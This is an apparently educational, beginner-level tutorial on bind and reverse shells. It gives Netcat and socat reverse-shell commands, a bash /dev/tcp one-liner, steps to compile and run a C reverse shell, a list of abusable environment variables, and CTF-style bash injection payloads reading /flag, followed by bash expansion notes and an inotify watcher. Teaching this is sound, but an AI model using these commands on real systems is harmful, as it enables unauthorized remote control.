---
title: "Shells"
topic: "shells"
tags: [shells, reverse-shell, bind-shell, netcat, c-programming]
difficulty: beginner
day: 2
layout: default
parent: Topics
nav_order: 2
---

# Shells

## What You Will Learn
- What a shell is and why gaining a shell is the ultimate goal in exploitation
- The difference between a bind shell and a reverse shell
- How to use Netcat to create both types of shells
- How to upgrade a simple shell to a fully interactive TTY
- Dangerous environment variables that can be abused for privilege escalation

## Introduction

Gaining a shell on your target system is the ultimate goal. This way the impact of a vulnerability can be demonstrated.

According to Wikipedia, "a shell is a computer program which exposes an operating system's services to a human user or other programs." Now think of it this way — say you want total control of a system: you want to be able to switch it on, use its camera, transfer its files, and so on. The easiest way this could be done is to have physical access to the device. Another way is to control the system remotely (you can stay in your office in another country and access your files and computer from home).

A malicious attacker with unauthorized access may also be able to do the same. If your system is compromised, just like you, they don't have to be in the same physical location. Most of the time when a compromise happens, the attacker accesses and controls your computer by typing commands through a shell, which takes the commands typed and executes them accordingly. An example of this is typing `shutdown now` on your Unix system — you don't have to press any button or click any GUI for this to happen, just a command does it. [Check this Wikipedia page for a more detailed explanation.](https://en.wikipedia.org/wiki/Shell_(computing))



## Executing Shell

There are two ways to access a shell: bind shell and reverse shell.

1. You connect to the computer in question (bind)
2. The computer connects to you (reverse)

**The Bind Shell** is rarely used in practice, due to firewalls that restrict inbound connections and dynamic IP addresses. In a bind shell, the victim machine listens for a connection and you connect to it. For this to work you need the IP address of the system and the port to connect to. Note: once the IP address changes there is no way to access the system unless you find its new IP.

## Using Netcat for a Bind Shell

First we need to install Netcat.

### Installing Netcat (`nc`) on Android, Windows, and Linux

Netcat (often abbreviated as `nc`) is a powerful network tool used for reading from and writing to network connections using TCP or UDP.

---

### Android

#### Option 1: Using Termux (Recommended)
1. Install [**Termux**](https://f-droid.org/en/packages/com.termux/) from F-Droid.
2. Run the following commands in Termux:
   ```bash
   pkg update
   pkg install netcat-openbsd
   ```

Netcat will be installed as `nc`.

#### Option 2: Using BusyBox (Root Required)
1. Install BusyBox from the Play Store or F-Droid.
2. Open a terminal emulator or ADB shell:
   ```bash
   busybox nc
   ```

### Windows

#### Option 1: Using Nmap's Ncat
1. Download and install Nmap from https://nmap.org/download.html.

> **Disclaimer:** Always verify the authenticity and integrity of files downloaded from external sources. Downloading and running binaries from the internet can pose security risks. Only use trusted sites and scan files for malware before execution.

2. Use Ncat (a Netcat-compatible tool) from the command line:
   ```powershell
   ncat.exe -l -p 4444
   ```

#### Option 2: Standalone Netcat Binary

> **Disclaimer:** Always verify the authenticity and integrity of files downloaded from external sources. Downloading and running binaries from the internet can pose security risks. Only use trusted sites and scan files for malware before execution.

1. Download from a trusted source like https://eternallybored.org/misc/netcat/
2. Extract and run from Command Prompt:
   ```cmd
   nc.exe -l -p 4444
   ```

### Linux

1. Debian/Ubuntu-based:
   ```bash
   sudo apt update
   sudo apt install netcat-openbsd
   ```
2. Arch-based:
   ```bash
   sudo pacman -S gnu-netcat
   ```
3. RHEL/CentOS/Fedora:
   ```bash
   sudo dnf install nmap-ncat
   ```

#### Verify Installation

```bash
nc --version
# or
ncat --version
```

> Note: Depending on your OS and install method, the command may be `nc`, `netcat`, or `ncat`.

Feel free to open an issue or PR if you encounter platform-specific differences!


## Using Netcat for a Bind Shell

```bash
# Attacker's host: connect to the remote machine
nc <IP> <port>

# Remote machine: listen for a connection
nc -nvlp <IP>
```

## Using Netcat for a Reverse Shell

```bash
# Attacker's host: wait for the victim to connect
nc -nlvp <PORT>

# Remote machine: connect back to the attacker
nc <IP> <PORT>

# Alternative one-liner on the victim
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

PS: Only Netcat is mentioned here; there are many tools to create reverse connections. [Check PayloadsAllTheThings for reverse shells with other tools.](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


### Shell Codes

Shellcode is code executed by a target program due to a vulnerability exploit and is used to open a remote shell.


### Upgrading Simple Shells to Fully Interactive TTYs

#### Using Python

On the victim:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl+Z` to background the shell.

On your local host:
```bash
stty raw -echo
```

Type `fg` and press Enter (you will not see your keystrokes — trust yourself and hit Enter).

On the victim:
```bash
export TERM=xterm
```

#### Using Socat

On the attacker (host):
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On the victim:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```


# C Reverse Shell (shell.c)

## Socket Creation

- `sockfd`: socket descriptor, an integer (like a file handle)
- `domain`: integer, specifies communication domain.
  - `AF_LOCAL`: communication between processes on the same host.
  - `AF_INET`: for communicating between processes on different hosts connected by IPv4.
  - `AF_INET6`: for processes connected by IPv6.
  - `AF_BLUETOOTH`: for low-level Bluetooth connections.
- `type`: communication type
  - `SOCK_STREAM`: TCP connection
  - `SOCK_DGRAM`: UDP connection
- `protocol`: Protocol value for Internet Protocol (IP).

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
```

## Socket Connection

Sends a connection request to a socket and connects if open (returns 0); fails otherwise (returns -1).

```c
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
```

https://www.geeksforgeeks.org/socket-programming-cc/

## How to Compile, Run, and Use shell.c for a Reverse Shell

> For educational/lab use only. Only test on your own machines or safe environments like TryHackMe or HackTheBox.

1. **Compile the code** on Linux:
   ```bash
   gcc -o shell shell.c
   ```

2. **Set up the listener** on the attacker machine:
   ```bash
   nc -lvnp 4444
   ```

3. **Run the reverse shell** on the victim (or your test machine):
   ```bash
   ./shell <ATTACKER_IP> 4444
   ```
   Example:
   ```bash
   ./shell 192.168.1.10 4444
   ```
   If successful, your listener terminal gets a shell:
   ```bash
   whoami
   pwd
   ```


### Change `$0`

```bash
bash -c 'source binary' './first_arg'  ping
```


### Create Shell Function and Export

```bash
did() { echo "inherited"; }
export -f did
```


### Dangerous Environment Variables

```
Execution & Loader Control

- PATH           – command hijacking
- IFS            – word-splitting abuse
- LD_PRELOAD     – shared object injection
- LD_LIBRARY_PATH – library resolution hijack
- LD_AUDIT       – runtime auditing hooks
- LD_DEBUG       – information leakage

Shell Execution & Evaluation

- BASH_ENV  – auto-executed in non-interactive bash
- ENV       – auto-executed in sh / dash / ksh
- PS4       – command substitution during set -x
- SHELLOPTS – forces shell behavior

Language / Runtime Injection

- PYTHONPATH
- PYTHONHOME
- PERL5LIB, PERLLIB
- RUBYLIB
- GEM_PATH, GEM_HOME
- NODE_OPTIONS
- JAVA_TOOL_OPTIONS

Filesystem & Config Redirection

- HOME
- TMPDIR
- XDG_CONFIG_HOME
- XDG_DATA_HOME

Locale / Parsing

- LANG
- LC_ALL
- LC_CTYPE
```


## Injection

```bash
if [[ "$1" -eq 1337 ]]
./run 'x[$(cat /flag)]'
```

```bash
-v x[$(cat /flag)]
```

# Restricted Eval

```bash
$0 = ./bash
eval '${0:2:9}'
```

```bash
# $# = 0 ; ${!#} = filename; $$ : pid; ${!@}  = ' '; $_=INPUT(last arg);
# /???/$_
```

```bash
$#   – number of positional parameters
$*   – all positional parameters as one word
$@   – all positional parameters as separate words
$?   – exit status of the last command
$$   – process ID of the current shell
$!   – process ID of the most recent background job
$-   – current shell option flags
$_   – last argument of the previous command
```


### Number of Characters in the Value

```bash
${#param}
```

```bash
echo $$        # e.g. 12345
echo ${#$}    # 5   (PID length)

false
echo $?       # 1
echo ${#?}    # 1   (character count)
```

```bash
set -- a bb ccc
echo $@
echo $*

echo ${#@}    # 3
echo ${#*}    # 3
```


### Pattern Removal

```bash
${parameter#pattern}
${parameter##pattern}
${parameter%pattern}
${parameter%%pattern}
```

#### Prefix Removal

```bash
#   → remove shortest match
##  → remove longest match
```

#### Suffix Removal

```bash
%   → remove shortest match
%%  → remove longest match
```

```bash
x="path/to/file.txt"

${x#*/}     → to/file.txt
${x##*/}    → file.txt
${x%.*}     → path/to/file
${x%%.*}    → path/to/file

# / ## remove from the left
# % / %% remove from the right
```

```bash
${@%.*}
```


### Indirect Expansion

```bash
${!x}  → indirect expansion
```

```bash
$# → 3
${!#} → ${!3}
${!3} → value of positional parameter $3
$3 → file.txt
```

```bash
$# = 0
${!#} → ${!0} → $0 # script name
```

```bash
$(($$==$$)) # 1
_=$#   # stores variable in _
```


### Conversion

```bash
${var,,} # convert to lower
${var^^} # convert to upper
```

```bash
<(:) # /dev/fd/63
```

```bash
__=<(:);____=$(<${__:0:9})
```

```bash
$($variable)
```

```bash
$~- # OLDPWD
```

```bash
x[$(cat</flag>&2)0]
```

### Logical vs. Physical Size

The logical size is the size reported by standard tools like `ls`, representing the file's full addressable range as seen by applications. The physical size (or disk usage) is the actual number of blocks allocated on the storage device, reported by the `du` command.


#### Watch Directory for Changes

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/inotify.h>
#include <limits.h>
#include <errno.h>
#include <string.h>

#define EVENT_BUF_LEN (1024 * (sizeof(struct inotify_event) + NAME_MAX + 1))

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <directory>\n", argv[0]);
        return 1;
    }

    int fd = inotify_init1(IN_NONBLOCK);
    if (fd < 0) {
        perror("inotify_init1");
        return 1;
    }

    int wd = inotify_add_watch(
        fd,
        argv[1],
        IN_CREATE | IN_MOVED_FROM | IN_MOVED_TO | IN_DELETE | IN_CLOSE_WRITE
    );

    if (wd < 0) {
        perror("inotify_add_watch");
        close(fd);
        return 1;
    }

    printf("[*] Watching directory: %s\n", argv[1]);

    char buffer[EVENT_BUF_LEN];

    while (1) {
        ssize_t length = read(fd, buffer, sizeof(buffer));
        if (length < 0) {
            if (errno == EAGAIN) {
                usleep(100000); // 100ms
                continue;
            }
            perror("read");
            break;
        }

        for (char *ptr = buffer; ptr < buffer + length; ) {
            struct inotify_event *event = (struct inotify_event *)ptr;

            if (event->len) {
                printf("[event] ");

                if (event->mask & IN_CREATE)      printf("CREATE ");
                if (event->mask & IN_MOVED_FROM)  printf("MOVED_FROM ");
                if (event->mask & IN_MOVED_TO)    printf("MOVED_TO ");
                if (event->mask & IN_DELETE)      printf("DELETE ");
                if (event->mask & IN_CLOSE_WRITE) printf("CLOSE_WRITE ");

                printf("-> %s\n", event->name);
            }

            ptr += sizeof(struct inotify_event) + event->len;
        }
    }

    inotify_rm_watch(fd, wd);
    close(fd);
    return 0;
}
```
